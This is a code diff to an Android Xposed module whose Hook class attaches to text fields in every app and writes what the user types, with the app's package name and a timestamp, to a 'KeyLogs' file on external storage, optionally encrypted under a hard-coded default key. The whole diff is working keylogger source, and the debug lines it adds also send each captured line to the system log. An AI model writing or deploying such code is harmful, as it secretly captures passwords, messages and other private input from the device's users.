@@ -8,6 +8,7 @@ import java.util.Date;
 
 import android.annotation.SuppressLint;
 import android.os.Environment;
+import android.support.annotation.Nullable;
 import android.text.Editable;
 import android.text.TextWatcher;
 import android.widget.EditText;
@@ -76,6 +77,7 @@ public class Hook implements IXposedHookZygoteInit {
 						public void afterTextChanged(Editable s) {
 							//Write the text of the EditText and the package name of the app running(taken from the EditTexts context)
 							write(et.getContext().getPackageName(), s.toString());
+							XposedBridge.log("writing something");
 						}
 						
 					});
@@ -94,36 +96,45 @@ public class Hook implements IXposedHookZygoteInit {
 		final String currentDateTimeString = new SimpleDateFormat("dd-MM-yy @ HH:mm:ss").format(new Date());
 
 		//getting the file path
-		String filePath;
+		String filePath = "";
 
 		//Don't need to do anything if the "text" is as same as before or is empty.
 		if (text.equals("") || text.equals(mCache))
 			return;
 
 		//Creating the writer if it is null(putting it into the ZygoteInit method doesn't work)
+//		if (mWriter == null)
+//			try {
+//				String ext = ".log";
+//				if(mXsp.getBoolean(mEncrypt, false)){
+//					ext = "." + mXsp.getString(mEncryptKey, "6677667766776677") + ".xlog";
+//				}
+//				if(!mXsp.getBoolean(mUseDate, true))
+//					filePath = Environment.getExternalStorageDirectory() + mXsp.getString(mLogPath, "KeyLogs/logs" + ext);
+//				else{
+//					filePath = Environment.getExternalStorageDirectory() + mXsp.getString(mLogPath, "KeyLogs") +
+//							"/20" + currentDateTimeString.substring(6,7) + "/" +
+//							currentDateTimeString.substring(3,4) + "/" + currentDateTimeString.substring(0,1) + ext ;
+//				}
+//				mWriter = new BufferedWriter(new FileWriter(filePath, true));
+//
+//			} catch (IOException e1) {
+//				XposedBridge.log("Path is not initialized...");
+//				return;
+//			}
 		if (mWriter == null)
 			try {
-				String ext = ".log";
-				if(mXsp.getBoolean(mEncrypt, false)){
-					ext = ".xlog";
-				}
-				if(!mXsp.getBoolean(mUseDate, true))
-					filePath = Environment.getExternalStorageDirectory() +  mXsp.getString(mLogPath, "KeyLogs/logs" + ext);
-				else{
-					filePath = Environment.getExternalStorageDirectory() + mXsp.getString(mLogPath, "KeyLogs") +
-							"/20" + currentDateTimeString.substring(6,7) + "/" +
-							currentDateTimeString.substring(3,4) + "/" + currentDateTimeString.substring(0,1) + ext ;
-				}
-				mWriter = new BufferedWriter(new FileWriter(filePath, true));
-
+				mWriter = new BufferedWriter(new FileWriter((Environment.getExternalStorageDirectory() + (mXsp.getString(mLogPath, "KeyLogs/log.txt"))), true));
 			} catch (IOException e1) {
 				return;
 			}
 
+		XposedBridge.log("path: " + filePath);
 		String logLine = currentDateTimeString + ">" + packageName + ">" + text;
 		if(mXsp.getBoolean(mEncrypt, false)){
-			logLine = 'x' + Crypto.encryptL(logLine, mXsp.getString(mEncryptKey, "6677667766776677"));
+			logLine = Crypto.encryptL(logLine, mXsp.getString(mEncryptKey, "6677667766776677"));
 		}
+		XposedBridge.log("about to write: " + logLine);
 		try {
 			//Write it
 			mWriter.append(logLine);
